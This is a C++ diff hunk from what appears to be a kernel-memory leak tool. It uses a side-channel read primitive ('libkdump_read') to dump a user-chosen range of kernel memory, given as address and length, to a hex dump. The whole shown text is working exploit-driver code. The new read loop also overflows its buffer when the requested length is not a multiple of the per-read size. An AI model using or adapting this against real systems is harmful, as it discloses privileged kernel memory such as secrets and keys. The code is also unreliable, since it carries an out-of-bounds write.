@@ -191,17 +191,20 @@ int main(int argc, char* argv[]) {
 			const std::size_t bytes_to_leak = std::stoull(argv[2]);
 			std::cout << "Leaking " << bytes_to_leak << " bytes from address " << std::hex << std::nouppercase << reinterpret_cast<void*>(target) << std::endl;
 
-			kernel_memory_iterator start = kernel_memory_iterator(reinterpret_cast<std::byte*>(target));
-			kernel_memory_iterator end = {};
-			end = kernel_memory_iterator(reinterpret_cast<std::byte*>(target) + bytes_to_leak);
-			hex_dump(output, reinterpret_cast<void*>(target), start, end);
+			std::unique_ptr<std::byte[]> buffer = std::make_unique<std::byte[]>(bytes_to_leak);
+			constexpr std::size_t bytes_per_read = std::tuple_size_v<std::invoke_result_t<decltype(&kdump::libkdump_read), std::size_t>>;
+			for(std::size_t i = 0; i < bytes_to_leak; i += bytes_per_read) {
+				std::array<std::byte, bytes_per_read> bytes = kdump::libkdump_read(target + i);
+				for(std::size_t j = 0; j < bytes_per_read; ++j) {
+					buffer[i + j] = bytes[j];
+				}
+			}
+			auto leaked = gsl::make_span(buffer.get(), gsl::narrow<std::ptrdiff_t>(bytes_to_leak));
+			hex_dump(output, reinterpret_cast<void*>(target), leaked.begin(), leaked.end());
 		}
 		break;
 	}
 
-	if(argc < 2) {
-	} else {
-	}
 	kdump::libkdump_cleanup();
 	return 0;
 }
